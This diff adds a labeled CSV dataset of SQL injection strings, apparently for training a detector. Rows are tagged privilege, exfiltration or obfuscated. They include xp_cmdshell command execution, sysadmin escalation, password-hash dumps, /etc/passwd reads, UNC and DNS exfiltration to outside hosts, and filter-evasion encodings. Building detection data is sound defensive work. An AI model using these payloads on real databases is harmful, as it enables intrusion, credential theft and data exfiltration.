@@ -1,0 +1,51 @@
+query,label,label_name,source
+EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';,3,privilege,real_github
+"-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null",3,privilege,real_github
+xp_dirtree '\\10.10.10.10\file',3,privilege,real_github
+"EXEC master.dbo.sp_addsrvrolemember 'User', 'sysadmin';",3,privilege,real_github
+"SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--",3,privilege,real_github
+MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.,3,privilege,real_github
+"OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB)",3,privilege,real_github
+"EXEC sp_configure 'xp_cmdshell',1;",3,privilege,real_github
+"utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)",3,privilege,real_github
+EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';,3,privilege,real_github
+"SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='<DBNAME>'",3,privilege,real_github
+"select 1 from openquery(""linkedserver"",'select 1;exec master..xp_cmdshell ""dir c:""')",3,privilege,real_github
+xp_cmdshell` is a system stored procedure in Microsoft SQL Server that allows you to run operating system commands directly from within T-SQL (Transact-SQL).,3,privilege,real_github
+"EXEC xp_cmdshell ""net user"";",3,privilege,real_github
+"SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'",3,privilege,real_github
+SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES),3,privilege,real_github
+SELECT name FROM master.sys.databases;,3,privilege,real_github
+"EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer",3,privilege,real_github
+"EXECUTE('EXECUTE(''sp_addsrvrolemember ''''User'''' , ''''sysadmin'''' '') AT ""DOMAIN\SQL01""') AT ""DOMAIN\SQL02""",3,privilege,real_github
+"utl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)",3,privilege,real_github
+SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins,3,privilege,real_github
+GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#,3,privilege,real_github
+"SELECT name, password_hash FROM master.sys.sql_logins",3,privilege,real_github
+SELECT LOAD_FILE('\\\\error\\abc');,4,exfiltration,real_github
+MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.,4,exfiltration,real_github
+SELECT '' INTO DUMPFILE '\\\\error\\abc';,4,exfiltration,real_github
+SELECT @@version INTO OUTFILE '\\\\192.168.0.100\\temp\\out.txt';,4,exfiltration,real_github
+UNION ALL SELECT LOAD_FILE('/etc/passwd') --,4,exfiltration,real_github
+SELECT @@version INTO DUMPFILE '\\\\192.168.0.100\\temp\\out.txt;,4,exfiltration,real_github
+SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);,4,exfiltration,real_github
+SELECT '' INTO OUTFILE '\\\\error\\abc';,4,exfiltration,real_github
+UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));,4,exfiltration,real_github
+xp_dirtree '\\10.10.10.10\file',4,exfiltration,real_github
+"SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))",4,exfiltration,real_github
+"SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));",4,exfiltration,real_github
+"If you are `root` on the database, you can re-enable the `LOAD_FILE` using the following query",4,exfiltration,real_github
+* `/*!12345UNION*/`: This means that the word UNION will be executed as part of the SQL statement if the MySQL version is 12.345 or higher.,2,obfuscated,real_github
+* **MSSQL 2000**: Hashcat mode 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`,2,obfuscated,real_github
+"* `/*!31337SELECT*/`: Similarly, the word SELECT will be executed if the MySQL version is 31.337 or higher.",2,obfuscated,real_github
+SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);,2,obfuscated,real_github
+"* `%bf%5c`: Represents the byte sequence `0xbf5c`. In GBK, this decodes to a valid multi-byte character followed by a backslash (`\`). This can be used to escape the next character in the sequence.",2,obfuscated,real_github
+SELECT @@version WHERE @@version LIKE '%12.0.2000.8%',2,obfuscated,real_github
+"* `%bf%27`: This is a URL-encoded representation of the byte sequence `0xbf27`. In the GBK character set, `0xbf27` decodes to a valid multibyte character followed by a single quote ('). When MySQL encounters this sequence, it interprets it as a single valid GBK character followed by a single quote, effectively ending the string.",2,obfuscated,real_github
+"SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))",2,obfuscated,real_github
+MySQL conditional comments are enclosed within `/*! ... */` and can include a version number to specify the minimum version of MySQL that should execute the contained code.,2,obfuscated,real_github
+"* `%a1%27`: Represents the byte sequence `0xa127`. In GBK, this decodes to a valid multi-byte character followed by a single quote (`'`).",2,obfuscated,real_github
+"UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #",2,obfuscated,real_github
+* **MSSQL 2005**: Hashcat mode 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`,2,obfuscated,real_github
+"**Examples**: `/*!12345UNION*/`, `/*!31337SELECT*/`",2,obfuscated,real_github
+"AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90",2,obfuscated,real_github
